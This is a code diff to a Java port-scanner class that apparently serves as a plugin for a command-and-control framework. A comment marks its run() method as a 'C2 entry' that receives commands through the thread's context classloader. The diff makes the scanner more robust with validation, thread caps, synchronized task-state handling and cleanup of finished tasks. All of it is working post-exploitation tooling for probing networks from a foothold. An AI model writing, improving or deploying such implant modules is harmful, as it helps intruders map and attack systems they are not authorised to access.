@@ -17,6 +17,10 @@ import java.util.concurrent.atomic.AtomicInteger;
  */
 public class PortScanComponent implements Runnable {
 
+    private static final int MAX_THREADS = 64;
+    private static final int MAX_TIMEOUT_MS = 300000;
+    private static final long STOPPED_TASK_TTL_MILLIS = 30L * 60L * 1000L;
+
     private HashMap params;
     private HashMap results;
 
@@ -39,6 +43,7 @@ public class PortScanComponent implements Runnable {
     private int scanTimeout;
 
     private String taskId;
+    private boolean workerMode;
 
 
 
@@ -47,42 +52,57 @@ public class PortScanComponent implements Runnable {
 
 
     public void invoke() throws Exception {
-        String methodName= (String) params.get("methodName");
-        if (methodName.equals("startScan")){
+        cleanupStoppedTasks();
+        String methodName = (String) params.get("methodName");
+        if ("startScan".equals(methodName)){
             String taskId=startScan(params);
             results.put("taskId",taskId);
             results.put("code",200);
-        }
-        if (methodName.equals("queryResult")){
+        } else if ("queryResult".equals(methodName)){
             String taskId= (String) params.get("taskId");
             HashMap scanTaskInfo= (HashMap) scanTasks.get(taskId);
-            if (scanTaskInfo != null) {
-                // 提取已扫描端口数
-                AtomicInteger completedCount = (AtomicInteger) scanTaskInfo.get("completedCount");
-                if (completedCount != null) {
-                    scanTaskInfo.put("scannedCount", completedCount.get());
+            if (scanTaskInfo == null) {
+                results.put("code", Integer.valueOf(404));
+                results.put("msg", "任务不存在");
+                return;
+            }
+            Object taskLock = taskLocks.get(taskId);
+            HashMap snapshot;
+            if (taskLock != null) {
+                synchronized (taskLock) {
+                    snapshot = new HashMap(scanTaskInfo);
+                }
+            } else {
+                snapshot = new HashMap(scanTaskInfo);
+            }
+            AtomicInteger completedCount = (AtomicInteger) scanTaskInfo.get("completedCount");
+            snapshot.put("scannedCount", Integer.valueOf(completedCount != null ? completedCount.get() : 0));
+            List ports = (List) scanTaskInfo.get("openPortList");
+            if (ports != null) {
+                synchronized (ports) {
+                    snapshot.put("openPortList", new ArrayList(ports));
                 }
             }
-            results.put("scanTaskInfo",scanTaskInfo);
+            results.put("scanTaskInfo",snapshot);
             results.put("code",200);
-        }
-        if (methodName.equals("pauseScan")){
+        } else if ("pauseScan".equals(methodName)){
             String taskId= (String) params.get("taskId");
             pauseScan(taskId);
             results.put("code",200);
             results.put("msg","暂停扫描成功");
-        }
-        if (methodName.equals("resumeScan")){
+        } else if ("resumeScan".equals(methodName)){
             String taskId= (String) params.get("taskId");
             resumeScan(taskId);
             results.put("code",200);
             results.put("msg","继续扫描成功");
-        }
-        if (methodName.equals("stopScan")){
+        } else if ("stopScan".equals(methodName)){
             String taskId= (String) params.get("taskId");
             stopScan(taskId);
             results.put("code",200);
             results.put("msg","终止扫描成功");
+        } else {
+            results.put("code", Integer.valueOf(400));
+            results.put("msg", "未知 methodName: " + methodName);
         }
 
     }
@@ -95,12 +115,13 @@ public class PortScanComponent implements Runnable {
         this.scanPort = scanPort;
         this.scanTimeout = scanTimeout;
         this.taskId=taskId;
+        this.workerMode = true;
     }
 
     @Override
     public void run() {
         // C2 入口：newInstance() 创建时字段为 null，线程工人构造器会设置字段
-        if (scanHost == null) {
+        if (!workerMode) {
             java.lang.reflect.InvocationHandler h = (java.lang.reflect.InvocationHandler) Thread.currentThread().getContextClassLoader();
             try {
                 params = (java.util.HashMap) h.invoke(null, null, null);
@@ -154,22 +175,26 @@ public class PortScanComponent implements Runnable {
         List openPortList= (List) scanTaskInfo.get("openPortList");
         AtomicInteger completedCount = (AtomicInteger) scanTaskInfo.get("completedCount");
         int portLength=((Number) scanTaskInfo.get("portLength")).intValue();
-        
+
+        synchronized (lock) {
+            if (STATE_STOPPED.equals(scanTaskInfo.get("status"))) return;
+        }
+
         // 再次检查状态（可能在等待期间被终止）
-        String status = (String) scanTaskInfo.get("status");
-        if (STATE_STOPPED.equals(status)) {
-            return;
+        int count;
+        try {
+            if (scanPort(scanHost,scanPort,scanTimeout)){
+                openPortList.add(scanPort);
+            }
+        } finally {
+            // 即使单个任务异常也必须推进计数，避免任务永久停在 RUNNING。
+            count = completedCount.incrementAndGet();
         }
-        
-        if (scanPort(scanHost,scanPort,scanTimeout)){
-            openPortList.add(scanPort);
-        }
-        // 增加已完成计数
-        int count = completedCount.incrementAndGet();
         // 使用同步块确保状态更新的原子性
-        synchronized (scanTaskInfo) {
-            if (count == portLength){
+        synchronized (lock) {
+            if (count >= portLength){
                 scanTaskInfo.put("status", STATE_STOPPED);
+                scanTaskInfo.put("finishedAt", Long.valueOf(System.currentTimeMillis()));
             }
         }
     }
@@ -178,8 +203,21 @@ public class PortScanComponent implements Runnable {
     private String startScan(HashMap params){
         String scanHost= (String) params.get("scanHost");
         int[] scanPorts= (int[]) params.get("scanPorts");
-        int scanTimeout= ((Number) params.get("scanTimeout")).intValue();
-        int threadsNum= ((Number) params.get("threadsNum")).intValue();
+        if (scanHost == null || scanHost.trim().length() == 0) {
+            throw new IllegalArgumentException("scanHost 不能为空");
+        }
+        if (scanPorts == null || scanPorts.length == 0) {
+            throw new IllegalArgumentException("scanPorts 不能为空");
+        }
+        int scanTimeout= params.get("scanTimeout") instanceof Number
+                ? ((Number) params.get("scanTimeout")).intValue() : 3000;
+        if (scanTimeout <= 0) scanTimeout = 3000;
+        if (scanTimeout > MAX_TIMEOUT_MS) scanTimeout = MAX_TIMEOUT_MS;
+        int threadsNum= params.get("threadsNum") instanceof Number
+                ? ((Number) params.get("threadsNum")).intValue() : 10;
+        if (threadsNum <= 0) threadsNum = 1;
+        if (threadsNum > MAX_THREADS) threadsNum = MAX_THREADS;
+        if (threadsNum > scanPorts.length) threadsNum = scanPorts.length;
         ExecutorService pool = Executors.newFixedThreadPool(threadsNum);
 
         HashMap scanTaskInfo=new HashMap();
@@ -187,6 +225,7 @@ public class PortScanComponent implements Runnable {
         scanTaskInfo.put("taskId",taskId);
         scanTaskInfo.put("status", STATE_RUNNING); // 使用status记录状态，初始为运行中
         scanTaskInfo.put("portLength",scanPorts.length);
+        scanTaskInfo.put("createdAt", Long.valueOf(System.currentTimeMillis()));
         // 为任务创建锁对象
         taskLocks.put(taskId, new Object());
         // 使用线程安全的列表
@@ -194,8 +233,18 @@ public class PortScanComponent implements Runnable {
         // 使用原子计数器跟踪已完成的扫描数量
         scanTaskInfo.put("completedCount",new AtomicInteger(0));
         scanTasks.put(taskId,scanTaskInfo);
-        for (int scanPort: scanPorts) {
-            pool.execute(new PortScanComponent(scanHost,scanPort,scanTimeout,taskId));
+        try {
+            for (int scanPort: scanPorts) {
+                if (scanPort < 1 || scanPort > 65535) {
+                    throw new IllegalArgumentException("端口超出范围: " + scanPort);
+                }
+                pool.execute(new PortScanComponent(scanHost,scanPort,scanTimeout,taskId));
+            }
+        } catch (RuntimeException e) {
+            scanTaskInfo.put("status", STATE_STOPPED);
+            scanTaskInfo.put("finishedAt", Long.valueOf(System.currentTimeMillis()));
+            pool.shutdownNow();
+            throw e;
         }
         pool.shutdown();
         return taskId;
@@ -224,14 +273,12 @@ public class PortScanComponent implements Runnable {
         if (scanTaskInfo == null) {
             throw new Exception("任务不存在");
         }
-        String status = (String) scanTaskInfo.get("status");
-        if (STATE_STOPPED.equals(status)) {
-            throw new Exception("任务已终止，无法暂停");
-        }
-        if (STATE_PAUSED.equals(status)) {
-            throw new Exception("任务已处于暂停状态");
-        }
-        synchronized (scanTaskInfo) {
+        Object lock = taskLocks.get(taskId);
+        if (lock == null) throw new Exception("任务锁不存在");
+        synchronized (lock) {
+            String status = (String) scanTaskInfo.get("status");
+            if (STATE_STOPPED.equals(status)) throw new Exception("任务已终止，无法暂停");
+            if (STATE_PAUSED.equals(status)) throw new Exception("任务已处于暂停状态");
             scanTaskInfo.put("status", STATE_PAUSED);
         }
     }
@@ -244,21 +291,14 @@ public class PortScanComponent implements Runnable {
         if (scanTaskInfo == null) {
             throw new Exception("任务不存在");
         }
-        String status = (String) scanTaskInfo.get("status");
-        if (STATE_STOPPED.equals(status)) {
-            throw new Exception("任务已终止，无法继续");
-        }
-        if (STATE_RUNNING.equals(status)) {
-            throw new Exception("任务正在运行中，无需继续");
-        }
-        synchronized (scanTaskInfo) {
+        Object lock = taskLocks.get(taskId);
+        if (lock == null) throw new Exception("任务锁不存在");
+        synchronized (lock) {
+            String status = (String) scanTaskInfo.get("status");
+            if (STATE_STOPPED.equals(status)) throw new Exception("任务已终止，无法继续");
+            if (STATE_RUNNING.equals(status)) throw new Exception("任务正在运行中，无需继续");
             scanTaskInfo.put("status", STATE_RUNNING);
-            Object lock = taskLocks.get(taskId);
-            if (lock != null) {
-                synchronized (lock) {
-                    lock.notifyAll(); // 唤醒所有等待的线程
-                }
-            }
+            lock.notifyAll(); // 唤醒所有等待的线程
         }
     }
     
@@ -270,17 +310,29 @@ public class PortScanComponent implements Runnable {
         if (scanTaskInfo == null) {
             throw new Exception("任务不存在");
         }
-        String status = (String) scanTaskInfo.get("status");
-        if (STATE_STOPPED.equals(status)) {
-            throw new Exception("任务已终止");
-        }
-        synchronized (scanTaskInfo) {
+        Object lock = taskLocks.get(taskId);
+        if (lock == null) throw new Exception("任务锁不存在");
+        synchronized (lock) {
+            String status = (String) scanTaskInfo.get("status");
+            if (STATE_STOPPED.equals(status)) throw new Exception("任务已终止");
             scanTaskInfo.put("status", STATE_STOPPED);
-            Object lock = taskLocks.get(taskId);
-            if (lock != null) {
-                synchronized (lock) {
-                    lock.notifyAll(); // 唤醒所有等待的线程
-                }
+            scanTaskInfo.put("finishedAt", Long.valueOf(System.currentTimeMillis()));
+            lock.notifyAll(); // 唤醒所有等待的线程
+        }
+    }
+
+    private void cleanupStoppedTasks() {
+        long now = System.currentTimeMillis();
+        Iterator it = ((Map) scanTasks).keySet().iterator();
+        while (it.hasNext()) {
+            Object id = it.next();
+            Map task = (Map) scanTasks.get(id);
+            if (task == null || !STATE_STOPPED.equals(task.get("status"))) continue;
+            Object finishedObj = task.get("finishedAt");
+            if (finishedObj instanceof Number
+                    && now - ((Number) finishedObj).longValue() > STOPPED_TASK_TTL_MILLIS) {
+                scanTasks.remove(id);
+                taskLocks.remove(id);
             }
         }
     }
